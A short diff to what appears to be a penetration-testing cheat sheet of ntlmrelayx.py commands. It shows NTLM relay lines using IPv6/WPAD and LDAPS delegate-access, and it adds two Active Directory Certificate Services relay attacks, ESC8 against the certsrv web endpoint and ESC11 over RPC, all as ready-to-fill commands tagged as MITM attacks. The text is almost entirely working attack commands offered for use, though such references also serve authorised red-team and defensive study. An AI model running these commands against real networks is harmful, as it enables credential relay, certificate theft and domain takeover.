@@ -47,3 +47,16 @@ ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
 ```
 ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
 ```
+
+
+## ADCS relay attack ESC8
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+ntlmrelayx.py -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template>
+```
+
+## ADCS relay attack ESC11
+#plateform/linux #target/serve #cat/ATTACK/MITM 
+```
+ntlmrelayx.py -t rpc://<ca_ip> -rpc-mode ICPR -icpr-ca-name <ca_name> -smb2support
+```
